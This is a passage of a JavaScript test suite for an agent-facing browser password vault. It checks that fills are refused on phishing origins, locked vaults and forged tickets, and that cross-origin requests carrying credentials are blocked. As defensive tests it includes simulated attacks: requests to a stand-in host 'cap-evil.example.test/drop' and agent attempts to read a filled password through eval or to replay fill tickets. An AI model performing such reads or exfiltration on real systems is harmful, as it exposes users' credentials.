      ok(fRef.code === 1 && /\[login_in_frame\]/.test(fRef.err)
        && fSelChild.code === 1 && /\[login_in_frame\]/.test(fSelChild.err)
        && fSelTag.code === 1 && /\[login_in_frame\]/.test(fSelTag.err)
        && badMask.code === 1 && /\[login_bad_field\]/.test(badMask.err) && fk.readDomValues(tid).plain === '',
        'RULING 5b: child-frame @ref, child-frame CSS selector, <iframe> element => login_in_frame; <input type="text"> => login_bad_field',
        { fRef: fRef.err.trim(), fSelChild: fSelChild.err.trim(), fSelTag: fSelTag.err.trim(), badMask: badMask.err.trim() });

      // L4: Two same-origin tabs A & B — `@ref` from tab A's superseded snapshot NEVER falls back to tab A when tab B is active!
      const tidB = fk.addTarget('https://shop.example.test/search');
      for (let i = 0; i < 30 && !fk.calls().some((c) => c.method === 'Target.attachToTarget' || c.tab === tidB); i++) {
        await new Promise((r) => setTimeout(r, 10));
      }
      fk.setDom(tid, { url: 'https://shop.example.test/login', elements: [{ id: 'u', tag: 'input', type: 'email', name: 'Email' }, { id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      fk.setDom(tidB, { url: 'https://shop.example.test/search', elements: [{ id: 'q', tag: 'input', type: 'text', name: 'Search' }] });
      watch.noteActiveTab({ profileId: PID, browserKey: KEY }, tid);
      await watch.noteSnapshot({ profileId: PID, browserKey: KEY }, '- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]');
      watch.noteActiveTab({ profileId: PID, browserKey: KEY }, tidB);
      await watch.noteSnapshot({ profileId: PID, browserKey: KEY }, '- textbox "Search" [ref=e1]');
      const insBeforeL4 = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      const crossTabPw = await runCli(['fill', '@e2', '--vault', 'shop.example.test#alice/password']);
      const crossTabUser = await runCli(['fill', '@e2', '--vault', 'shop.example.test#alice/user']);
      const insAfterL4 = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      ok(crossTabPw.code === 1 && /\[target_not_found\]/.test(crossTabPw.err)
        && crossTabUser.code === 1 && /\[target_not_found\]/.test(crossTabUser.err)
        && insAfterL4 === insBeforeL4 && fk.readDomValues(tid).pw === '' && fk.readDomValues(tid).u === '',
        'L4: `@ref` absent from active tab B refuses [target_not_found] with 0 Input.insertText calls and never types into background tab A',
        { pwErr: crossTabPw.err.trim(), userErr: crossTabUser.err.trim(), tabAVals: fk.readDomValues(tid) });
      watch.noteActiveTab({ profileId: PID, browserKey: KEY }, tid);

      fk.setDom(tid, { url: 'https://shop.example.test/login', origin: 'https://evil.example.test', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const phishDom = await runCli(['fill', '#pw', '--vault', 'shop.example.test#alice/password']);
      ok(phishDom.code === 1 && /\[login_phishing\]/.test(phishDom.err), 'browser-vs-DOM origin mismatch refused login_phishing');

      // M1: Locked vault on wrong-origin tab refuses 423 vault_locked BEFORE any CDP call (both CLI and HTTP); bad_request => 400!
      fk.setDom(tid, { url: 'https://evil.example.test/phish', elements: [{ id: 'npw', tag: 'input', type: 'password', name: 'Password' }] });
      eng.lock();
      const cdpMarkLocked = fk.mark();
      const lockedCli = await runCli(['fill', '#npw', '--vault', 'shop.example.test#alice/password']);
      const lockedHttp = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
      const lockedWatch = await watch.fillVaultField({ profileId: PID, browserKey: KEY }, { target: '#npw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: [CID] } });
      const cdpCallsWhileLocked = fk.calls().filter((c) => c.seq > cdpMarkLocked);
      ok(lockedCli.code === 1 && /\[vault_locked\]/.test(lockedCli.err)
        && lockedHttp.status === 423 && lockedHttp.json?.code === 'vault_locked'
        && lockedWatch.code === 'vault_locked'
        && cdpCallsWhileLocked.length === 0,
        'M1: locked vault on wrong-origin tab refuses 423 [vault_locked] across CLI, HTTP, and watch with ZERO CDP calls',
        { cliErr: lockedCli.err.trim(), httpStatus: lockedHttp.status, cdpCalls: cdpCallsWhileLocked });
      await eng.unlock(VPW);

      const cdpMarkBad = fk.mark();
      const badGenUser = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'shop.example.test#alice/user', generate: true }, agentHdr);
      const badNewNoGen = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'new:shop.example.test#x/password', generate: false }, agentHdr);
      const badUnknownField = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'shop.example.test#alice/secret' }, agentHdr);
      ok(badGenUser.status === 400 && badGenUser.json?.code === 'bad_request'
        && badNewNoGen.status === 400 && badNewNoGen.json?.code === 'bad_request'
        && badUnknownField.status === 400 && badUnknownField.json?.code === 'bad_request'
        && fk.calls().filter((c) => c.seq > cdpMarkBad).length === 0,
        'M1 / Minor: invalid fill-vault spec shapes (--generate on /user, new: without --generate, unknown field) return HTTP 400 bad_request with 0 CDP calls',
        { badGenUser: badGenUser.status, badNewNoGen: badNewNoGen.status, badUnknownField: badUnknownField.status });

      fk.setDom(tid, {
        url: 'https://shop.example.test/register',
        elements: [
          { id: 'npw', tag: 'input', type: 'password', name: 'New password' },
          { id: 'cpw', tag: 'input', type: 'password', name: 'Confirm password' },
          { id: 'opw', tag: 'input', type: 'password', name: 'Old password' },
        ],
      });

      // Ruling 1 & 5 + L2: `new:<site>#bob/password --generate` + Vault window `{ name, rev: entry.rev }` Confirm & Discard at `rev >= 2`
      const genReg = await runCli(['fill', '#npw', '--vault', 'new:shop.example.test#bob/password', '--generate']);
      const bobName = BL.entryName('https://shop.example.test', 'bob');
      const bobRec1 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      const PW_BOB_1 = bobRec1?.pending?.password || '';
      const openPendingCards1 = [...fyItems.values()].filter((x) => x.status === 'open' && x.action?.type === 'save-login' && x.action?.pending === 'register');
      ok(genReg.code === 0 && PW_BOB_1.length === 24 && bobRec1?.current === null && bobRec1?.pending?.kind === 'register'
        && fk.readDomValues(tid).npw === PW_BOB_1 && !genReg.out.includes(PW_BOB_1) && openPendingCards1.length === 1,
        'RULING 1 & 5: `new:... --generate` seals 24-char pending:"register" before typing, types into #npw, and files ONE For-you Confirm/Discard card',
        { len: PW_BOB_1.length, cards: openPendingCards1.length });

      // Unconfirmed register: `/password` resolves to `pending` so confirm-password / first sign-in works!
      const fillConfirmBox = await runCli(['fill', '#cpw', '--vault', 'shop.example.test#bob/password']);
      const dupGen = await runCli(['fill', '#cpw', '--vault', 'shop.example.test#bob/password', '--generate']);
      ok(fillConfirmBox.code === 0 && fk.readDomValues(tid).cpw === PW_BOB_1 && dupGen.code === 1 && /\[login_pending_exists\]/.test(dupGen.err),
        'RULING 1: while current===null, `/password` resolves to pending; second `--generate` refuses login_pending_exists');

      // Agent bearer CANNOT call human confirm/discard routes!
      const agConfirm = await reqJson('POST', '/api/vault/web-logins/confirm', { name: bobName }, agentHdr);
      const agDiscard = await reqJson('POST', '/api/vault/web-logins/discard', { name: bobName }, agentHdr);
      ok(agConfirm.status === 403 && agDiscard.status === 403,
        'RULING 1: the confirm/discard route refuses an agent bearer (403 human_only)', { agConfirm: agConfirm.status, agDiscard: agDiscard.status });

      // Human owner confirms via Vault window payload (`GET /api/vault/web-logins` -> `{ name, rev: entry.rev }`)
      const winList1 = await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr);
      const bobWin1 = (winList1.json?.entries || []).find((e) => e.name === bobName);
      const ownConfirm1 = await reqJson('POST', '/api/vault/web-logins/confirm', { name: bobName, ...(bobWin1?.rev != null ? { rev: bobWin1.rev } : {}) }, ownerHdr);
      const bobRec2 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      ok(ownConfirm1.status === 200 && bobRec2.current?.password === PW_BOB_1 && bobRec2.pending === null && openPendingCards1[0].status === 'done',
        'RULING 1: owner Confirm promotes pending -> current and resolves the For-you card');

      // Password change `--generate` -> `pending: 'change'` at `rev === 3` (`rev >= 2`); `/password` resolves to `current` (`PW_BOB_1`), `/pending` to `PW_BOB_2`
      const genChg1 = await runCli(['fill', '#npw', '--vault', 'shop.example.test#bob/password', '--generate']);
      const bobRec3 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      const PW_BOB_2 = bobRec3?.pending?.password || '';
      const fillCurWhilePending = await runCli(['fill', '#opw', '--vault', 'shop.example.test#bob/password']);
      const fillPendSlot = await runCli(['fill', '#cpw', '--vault', 'shop.example.test#bob/pending']);
      ok(genChg1.code === 0 && PW_BOB_2.length === 24 && PW_BOB_2 !== PW_BOB_1
        && fillCurWhilePending.code === 0 && fk.readDomValues(tid).opw === PW_BOB_1
        && fillPendSlot.code === 0 && fk.readDomValues(tid).cpw === PW_BOB_2,
        'RULING 1: during unconfirmed change, `/password` fills current and `/pending` fills candidate');

      // 7-day one-time reminder check through logins.maybeRemindPending
      clock += 6 * DAY;
      const rem6 = logins.maybeRemindPending(PID);
      clock += 2 * DAY; // +8d total
      const rem8 = logins.maybeRemindPending(PID);
      clock += 30 * DAY; // +38d total — still NOT auto-promoted and NO second reminder!
      const rem38 = logins.maybeRemindPending(PID);
      const bobAfter38d = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      ok(rem6 === 0 && rem8 === 1 && rem38 === 0 && bobAfter38d?.current?.password === PW_BOB_1 && bobAfter38d?.pending?.password === PW_BOB_2,
        'RULING 1: maybeRemindPending fires 0 times at +6d, ONCE at +8d, 0 times at +38d, and never promotes pending by clock',
        { rem6, rem8, rem38 });

      // L2: Vault window Discard on change (`rev >= 2`) using exact `{ name, rev: entry.rev }` from `GET /api/vault/web-logins`!
      const winListChg = await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr);
      const bobWinChg = (winListChg.json?.entries || []).find((e) => e.name === bobName);
      const ownDiscard = await reqJson('POST', '/api/vault/web-logins/discard', { name: bobName, ...(bobWinChg?.rev != null ? { rev: bobWinChg.rev } : {}) }, ownerHdr);
      const bobAfterDisc = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      ok(bobWinChg?.rev === bobAfter38d?.rev && (bobWinChg?.rev ?? 0) >= 2 && ownDiscard.status === 200 && bobAfterDisc?.current?.password === PW_BOB_1 && bobAfterDisc?.pending === null,
        'L2 + RULING 1: GET /api/vault/web-logins exposes rev>=2 on change pending, and Vault-window Discard ({name, rev}) clears pending without card_changed',
        { listRev: bobWinChg?.rev, sealedRev: bobAfter38d?.rev, status: ownDiscard.status });

      // L2: Second `--generate` change (`rev >= 4`), confirmed via Vault-window `{ name, rev: entry.rev }`, rotates `previous`!
      await runCli(['fill', '#npw', '--vault', 'shop.example.test#bob/password', '--generate']);
      const bobPend3 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      const PW_BOB_3 = bobPend3?.pending?.password || '';
      const winListChg2 = await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr);
      const bobWinChg2 = (winListChg2.json?.entries || []).find((e) => e.name === bobName);
      const winConfirmChg = await reqJson('POST', '/api/vault/web-logins/confirm', { name: bobName, ...(bobWinChg2?.rev != null ? { rev: bobWinChg2.rev } : {}) }, ownerHdr);
      const fillPrev = await runCli(['fill', '#opw', '--vault', 'shop.example.test#bob/previous']);
      ok(bobWinChg2?.rev === bobPend3?.rev && (bobWinChg2?.rev ?? 0) >= 4 && winConfirmChg.status === 200 && winConfirmChg.json?.confirmed === true
        && fillPrev.code === 0 && fk.readDomValues(tid).opw === PW_BOB_1,
        'L2 + RULING 1: Vault-window Confirm ({name, rev}) on rev>=2 change promotes candidate -> current and rotates old current -> `/previous`');

      // L2: Re-registration after loginRevFloor rise (`rev >= 2`) confirmed via Vault-window `{ name, rev: entry.rev }` + For-you card Confirm leg!
      const reregName = BL.entryName('https://shop.example.test', 'rereg');
      await runCli(['fill', '#npw', '--vault', 'new:shop.example.test#rereg/password', '--generate']);
      const PW_REREG_1 = BL.recordOf(eng.secretGet(reregName).value.toString('utf8'))?.pending?.password || '';
      const winRereg1 = (await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr)).json?.entries?.find((e) => e.name === reregName);
      const discRereg1 = await reqJson('POST', '/api/vault/web-logins/discard', { name: reregName, rev: winRereg1?.rev }, ownerHdr);
      await runCli(['fill', '#npw', '--vault', 'new:shop.example.test#rereg/password', '--generate']);
      const reregRec2 = BL.recordOf(eng.secretGet(reregName).value.toString('utf8'));
      const PW_REREG_2 = reregRec2?.pending?.password || '';
      const winRereg2 = (await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr)).json?.entries?.find((e) => e.name === reregName);
      const confRereg2 = await reqJson('POST', '/api/vault/web-logins/confirm', { name: reregName, rev: winRereg2?.rev }, ownerHdr);
      ok(discRereg1.status === 200 && winRereg2?.rev === reregRec2?.rev && (winRereg2?.rev ?? 0) >= 2 && confRereg2.status === 200,
        'L2: re-registration after floor rise (rev>=2) exposes exact rev in /api/vault/web-logins and confirms cleanly via Vault-window {name, rev}',
        { reregRev: winRereg2?.rev, confStatus: confRereg2.status });

      // L3: End-to-end custom-kernel owner takeover `VibeSpace.credentialSubmitted` (`usernameHint` -> `offerOwnerSaveCard`) + malformed drop notice!
      const PW_TAKEOVER = 'HumanTyped!' + crypto.randomBytes(5).toString('hex');
      isTakeover = true;
      const cardsBeforeL3 = [...fyItems.values()].filter((x) => x.status === 'open' && x.action?.type === 'save-login' && !x.action?.pending).length;
      fk.submitCredentialForm({ targetId: tid, origin: 'https://shop.example.test', usernameHint: 'human1', password: PW_TAKEOVER, outcome: 'navigated' });
      for (let i = 0; i < 30 && [...fyItems.values()].filter((x) => x.status === 'open' && x.action?.type === 'save-login' && !x.action?.pending).length === cardsBeforeL3; i++) {
        await new Promise((r) => setTimeout(r, 10));
      }
      const tkCardItem = [...fyItems.values()].find((x) => x.status === 'open' && x.action?.type === 'save-login' && !x.action?.pending);
      const tkCard = tkCardItem ? logins.cardOf(tkCardItem.action.id) : null;

      // Missing `usernameHint` during takeover -> journal log + `takeover-save-dropped` For-you notice (never silent!)
      fk.submitCredentialForm({ targetId: tid, origin: 'https://shop.example.test', usernameHint: '', password: PW_TAKEOVER, outcome: 'navigated' });
      for (let i = 0; i < 30 && ![...fyItems.values()].some((x) => x.kind === 'notice' && /was not offered to the vault/.test(x.text || '')); i++) {
        await new Promise((r) => setTimeout(r, 10));
      }
      isTakeover = false;
      const dropNotices = [...fyItems.values()].filter((x) => x.kind === 'notice' && /was not offered to the vault/.test(x.text || ''));
      ok(Boolean(tkCard) && dropNotices.length === 1 && hubLogs.some((l) => /save-login card refused|takeover save-login card not offered/.test(l)),
        'L3: kernel credentialSubmitted(usernameHint) during owner takeover files save-login For-you card; missing usernameHint logs warning and files 1 takeover-save-dropped notice',
        { hasCard: Boolean(tkCard), dropNotices: dropNotices.length });

      if (tkCard) {
        const agCardTry = await reqJson('POST', `/api/browser/logins/cards/${tkCard.id}/approve`, { shown: tkCard.shown }, agentHdr);
        ok(agCardTry.status === 403 && agCardTry.json?.code === 'agent_forbidden', 'the save-login card route refuses an agent bearer (403 agent_forbidden)');
        const staleCardTry = await reqJson('POST', `/api/browser/logins/cards/${tkCard.id}/approve`, { shown: '0000000000000000' }, ownerHdr);
        ok(staleCardTry.status === 409 && staleCardTry.json?.code === 'card_changed' && !eng.hasEntry(BL.entryName('https://shop.example.test', 'human1')),
          'a card answered with another digest is refused card_changed and saves nothing');
        const okCardTry = await reqJson('POST', `/api/browser/logins/cards/${tkCard.id}/approve`, { shown: tkCard.shown }, ownerHdr);
        ok(okCardTry.status === 200 && okCardTry.json?.saved === true && eng.hasEntry(BL.entryName('https://shop.example.test', 'human1')),
          'owner answering takeover save-login card with matching digest seals login');
      }

      // Locked-boot `answerCard` => `vault_locked`
      await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/noop', postData: 'x=1', finish: true });
      await runCli(['fill', '#npw', '--vault', 'shop.example.test#alice/password']);
      watch.shutdown();
      eng.lock();
      const loginsLockedBoot = Lm.create({ vault: eng, grants: () => grants, forYou, now: () => clock, log: () => {} });
      const lockedCardAns = loginsLockedBoot.answerCard('sl-deadbeef', { approve: true, shown: '0123456789abcdef', who: 'owner' });
      ok(!lockedCardAns.ok && lockedCardAns.code === 'vault_locked',
        'after locked hub restart, answering a pending/save-login card returns vault_locked (never card_gone)', lockedCardAns);
      await eng.unlock(VPW);

      // Ruling 5c / RULE 5′: 51+ needle byte scan across entire data/ tree
      const allSecrets = [VPW, PW_ALICE, PW_BOB_1, PW_BOB_2, PW_BOB_3, PW_REREG_1, PW_REREG_2, PW_TAKEOVER];
      const diskHits = [];
      for (const f of walkFiles(DATA)) {
        const raw = fs.readFileSync(f, 'utf8');
        const rel = path.relative(DATA, f);
        for (const s of allSecrets) {
          for (const ndl of secretNeedles(s)) {
            if (raw.includes(ndl)) diskHits.push(`${rel}:${ndl.slice(0, 12)}`);
          }
        }
      }
      ok(diskHits.length === 0, `RULING 5c / RULE 5′: zero raw/encoded/sha256/sha1/sha512 secret traces across ${walkFiles(DATA).length} files in data/ (${allSecrets.length * 17} needles)`, diskHits);

      // ── r24/r25 FAST LEGS: m3 (parallel verbRunning via server ticket), A2 (forged vaultFill/fillTicket), m4, m1, N4 ──
      // m3: parallel verbRunning counter stays balanced (`started: true` on server-ticketed `/resolve` pairs 1-to-1 with `/audit` `ended: true`)
      {
        while (watch.verbRunning(KEY)) watch.verbEnded(KEY, { profileId: PID });
        const idleBefore = watch.verbRunning(KEY);
        const resWait = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['wait', '5000'], wrapper: true }, agentHdr);
        const runningBeforeFill = watch.verbRunning(KEY);
        const prepVf = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const resVf = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#npw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: prepVf.json?.fillTicket }, agentHdr);
        const audVf = await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'fill', ok: true, since: resVf.json?.at || 1 }, agentHdr);
        const runningAfterFill = watch.verbRunning(KEY);
        const audWait = await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'wait', ok: true, since: resWait.json?.at || 1 }, agentHdr);
        const runningAfterWait = watch.verbRunning(KEY);
        ok(idleBefore === false && resWait.status === 200 && prepVf.status === 200 && resVf.status === 200 && !('cdpUrl' in (resVf.json || {}))
          && runningBeforeFill === true && audVf.status === 200 && runningAfterFill === true && audWait.status === 200 && runningAfterWait === false,
          'm3 + A2: parallel verb stays verbRunning()===true after server-ticketed fill --vault /resolve (no cdpUrl) + /audit, then drops to false when parallel verb finishes',
          { idleBefore, runningBeforeFill, runningAfterFill, runningAfterWait, vfKeys: Object.keys(resVf.json || {}) });
      }

      // A2: Request-body flags (`vaultFill: true`, forged `fillTicket`, or a real `fillTicket` replayed on another argv) NEVER bypass `liveFillRefusal`, `scrubOutput`, or `checkActiveTabFence`!
      {
        // Note: `#npw` currently holds `PW_ALICE` on `tid` (`https://shop.example.test/login` — let's make sure a live fill is armed on `tid`)
        fk.setDom(tid, { url: 'https://shop.example.test/login', elements: [{ id: 'npw', tag: 'input', type: 'password', name: 'Password' }] });
        await watch.arm(PID);
        const fillLive = await runCli(['fill', '#npw', '--vault', 'shop.example.test#alice/password']);
        const fgEval = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', 'document.querySelector("#npw").value'], wrapper: true, vaultFill: true }, agentHdr);
        const fgGet = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['get', 'value', '#npw'], wrapper: true, vaultFill: true }, agentHdr);
        const fgSnap = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['snapshot'], wrapper: true, vaultFill: true }, agentHdr);
        const fgShot = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['screenshot'], wrapper: true, vaultFill: true }, agentHdr);
        const realPrep = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const swapEval = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', 'document.querySelector("#npw").value'], wrapper: true, fillTicket: realPrep.json?.fillTicket }, agentHdr);
        const realPrepArgv = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const swapClick = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '#other'], wrapper: true, fillTicket: realPrepArgv.json?.fillTicket }, agentHdr);
        const realPrepConsume = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const validFill = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#npw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: realPrepConsume.json?.fillTicket }, agentHdr);
        const replayFill = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#npw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: realPrepConsume.json?.fillTicket }, agentHdr);
        const clickWithForgedFlag = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '#npw'], wrapper: true, vaultFill: true }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'click', ok: true, since: swapClick.json?.at || 1 }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'fill', ok: true, since: validFill.json?.at || 1 }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'fill', ok: true, since: replayFill.json?.at || 1 }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'click', ok: true, since: clickWithForgedFlag.json?.at || 1 }, agentHdr);
        ok(fillLive.code === 0
          && fgEval.status === 409 && fgEval.json?.code === 'login_fill_live'
          && fgGet.status === 409 && fgGet.json?.code === 'login_fill_live'
          && fgSnap.status === 409 && fgSnap.json?.code === 'login_fill_live'
          && fgShot.status === 409 && fgShot.json?.code === 'login_fill_live'
          && swapEval.status === 409 && swapEval.json?.code === 'login_fill_live'
          && swapClick.status === 200 && Boolean(swapClick.json?.socketDir)
          && validFill.status === 200 && !('socketDir' in (validFill.json || {})) && !('cdpUrl' in (validFill.json || {}))
          && replayFill.status === 200 && Boolean(replayFill.json?.socketDir)
          && clickWithForgedFlag.status === 200 && clickWithForgedFlag.json?.scrubOutput === true,
          'A2 + r26: forged vaultFill:true and argv-swapped fillTicket on eval/get/snapshot/screenshot return 409; argv-swapped fillTicket on click is NOT accepted as server fill (retains socketDir); matching fill consumes ticket once; scrubOutput stays true',
          { fgEval: fgEval.status, swapEval: swapEval.status, swapClickSocketDir: Boolean(swapClick.json?.socketDir), validNoSocketDir: !('socketDir' in (validFill.json || {})), replaySocketDir: Boolean(replayFill.json?.socketDir), scrubOutput: clickWithForgedFlag.json?.scrubOutput });
      }

      // m4 route precheck (`tabOrigin: ''` -> `http://localhost:<port>` entry resolved with 0 false `login_no_entry` or `login_bad_origin`)
      {
        const lhPort = await deadPort();
        const lhOrigin = `http://localhost:${lhPort}`;
        logins.addOwn({ origin: lhOrigin, username: 'localdev', password: 'LocalDev!Password99' }, { who: 'owner' });
        logins.grant(`web-login:${lhOrigin}#localdev`, 'this-account', `session:${CID}`);
        const preLh = watch.precheckVaultFill({
          target: '#pw',
          spec: `localhost:${lhPort}#localdev/password`,
          facts: { conversationKeys: [CID] },
          profileId: PID,
        });
        ok(Boolean(preLh && preLh.ok && preLh.origin === lhOrigin),
          'm4: precheckVaultFill resolves bare localhost:<port>#user/password against saved http://localhost:<port> entry',
          preLh);
      }

      // m1: custom-kernel `http-auth` surface never promises `fill @ref --vault` or retired `vibespace-browser login`
      {
        const SF = require(path.join(REPO, 'src/browser-surfaces.js'));
        const manualTxt = fs.readFileSync(path.join(REPO, 'docs/agent/browser-manual.md'), 'utf8');
        const httpSurf = fk.openSurface({
          targetId: tid,
          kind: 'http-auth',
          origin: 'https://shop.example.test',
          title: 'Sign in',
          fields: [{ fieldId: 'u', type: 'text', label: 'Username', required: true }, { fieldId: 'p', type: 'password', label: 'Password', required: true }],
          answers: [{ id: 'sign-in', label: 'Sign in', kind: 'credential' }, { id: 'cancel', label: 'Cancel', kind: 'dismiss' }],
        });
        await new Promise((r) => setTimeout(r, 20));
        const stood = watch.surfacesIn(PID)?.find((s) => s.id === httpSurf.surfaceId) || null;
        const stxt = stood ? SF.surfaceText(stood, { now: clock }) : '';
        fk.closeSurface(httpSurf.surfaceId, { how: 'dismissed', by: 'page' });
        const httpManualLine = manualTxt.split('\n').find((l) => l.includes('**An HTTP sign-in**')) || '';
        ok(Boolean(stood && !stood.logins && !/fill @ref --vault/.test(stxt) && /Only the user can pick/.test(stxt))
          && !/vibespace-browser login\b/.test(httpManualLine) && /only the user can answer it/i.test(httpManualLine),
          'm1: custom-kernel http-auth surface and browser-manual never promise fill --vault or retired login, directing agent to user / cancel',
          { stoodLogins: stood?.logins, stxt, httpManualLine });
      }

      // N4: PURE + fake-kernel scan-limit fail-closed matrix (all 7 caps: cross-origin blocked + 1 notice, same-origin allowed)
      if (typeof Dm.inspectRequestBody === 'function' && Dm.SCAN_LIMITS) {
        const sigsN4 = [Dm.credSigOf(PW_ALICE)];
        const capCases = [
          ['string_too_long', 'application/json', JSON.stringify({ pad: 'a'.repeat(Dm.SCAN_LIMITS.maxStringChars + 5) })],
          ['json_too_many_nodes', 'application/json', JSON.stringify(Array.from({ length: Dm.SCAN_LIMITS.maxJsonNodes + 5 }, () => 0))],
          ['nested_json_too_many_nodes', 'application/json', JSON.stringify({ inner: JSON.stringify(Array.from({ length: Dm.SCAN_LIMITS.maxNestedJsonNodes + 5 }, () => 0)) })],
          ['text_too_many_lines', 'text/plain', Array.from({ length: Dm.SCAN_LIMITS.maxTextLines + 5 }, () => 'k=v').join('\n')],
          ['multipart_too_many_parts', 'multipart/form-data; boundary=capBnd', Array.from({ length: Dm.SCAN_LIMITS.maxMultipartParts + 2 }, (_, i) => `--capBnd\r\nContent-Disposition: form-data; name="f${i}"\r\n\r\nv\r\n`).join('') + '--capBnd--\r\n'],
          ['too_many_base64_tokens', 'text/plain', Array.from({ length: Dm.SCAN_LIMITS.maxB64Tokens + 2 }, () => 'YWJjZGVm').join(' ')],
          ['body_too_large', 'text/plain', 'z'.repeat(Dm.SCAN_LIMITS.maxBodyBytes + 16)],
        ];
        const pureBad = [];
        for (const [wantReason, ct, body] of capCases) {
          const ir = Dm.inspectRequestBody(body, sigsN4, ct, { hasPostData: true });
          if (ir.carries !== false || ir.undecodable !== true || ir.reason !== wantReason) {
            pureBad.push({ wantReason, got: ir });
          }
        }
        ok(pureBad.length === 0, 'N4 (PURE): all 7 scan caps return { carries: false, undecodable: true, reason } instead of failing open', pureBad);

        // Drive all 7 scan caps over the live watch (`tid` has `PW_ALICE` live from earlier fill): cross-origin blocked + 1 notice, same-origin continues
        const xoBeforeCaps = [...fyItems.values()].filter((x) => x.kind === 'notice' && /Blocked a cross-origin request/.test(x.text || '')).length;
        const capWireBad = [];
        for (const [wantReason, ct, body] of capCases) {
          const xo = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://cap-evil.example.test/drop', headers: { 'content-type': ct }, postData: body, finish: false });
          const so = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/harmless-large', headers: { 'content-type': ct }, postData: body, finish: false });
          if (xo.action !== 'fail' || xo.errorReason !== 'BlockedByClient' || so.action !== 'continue') {
            capWireBad.push({ wantReason, xo, so });
          }
        }
        const xoAfterCaps = [...fyItems.values()].filter((x) => x.kind === 'notice' && /Blocked a cross-origin request/.test(x.text || '')).length;
        ok(capWireBad.length === 0 && (xoAfterCaps - xoBeforeCaps) === 1,
          'N4 (fake kernel): all 7 scan caps block cross-origin with BlockedByClient + 1 dedup notice while allowing same-origin',
          { capWireBad, noticeDelta: xoAfterCaps - xoBeforeCaps });
      }
    }
  } finally {
    watch.shutdown();
    try { srv.close(); } catch {}
    await fk.close();
    LF?.clearAllFilledSecrets?.();
    eng.close();
    fs.rmSync(ROOT4, { recursive: true, force: true });
  }
}

// ═══ ④b r24 DEDICATED FAKE-KERNEL PROOFS: N1 (hold + mode-flip) + m2 (Network.disable) + N2 (3000-row AX) + N5 (6 attacks) ═══
console.log('④b r24 fake-kernel proofs: N1 hold/mode-flip Fetch · m2 Network.disable · N2 3000-row on-demand queryAXTree · N5 post-prepare attacks');
if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
  const ROOT4B = scratch('vl-r24-proofs');
  fs.rmSync(ROOT4B, { recursive: true, force: true });
  fs.mkdirSync(ROOT4B, { recursive: true });
  const fkStd = await startFakeKernel({ firstUrl: 'https://shop.example.test/login', mode: { standard: true } });
  const engB = VE.create({ dataDir: ROOT4B, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
  await engB.setup('R24Proof#Master9');
  try {
    const gB = GS.create({ memory: true });
    const fyB = [];
    const logB = Lm.create({
      vault: engB, grants: () => gB, log: () => {},
      forYou: { add: (_pid, it) => { fyB.push(it); return `fy-${fyB.length}`; }, resolve() {} },
    });
    const PW_N1 = 'N1HoldSecret!' + crypto.randomBytes(4).toString('hex');
    logB.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_N1 }, { who: 'owner' });
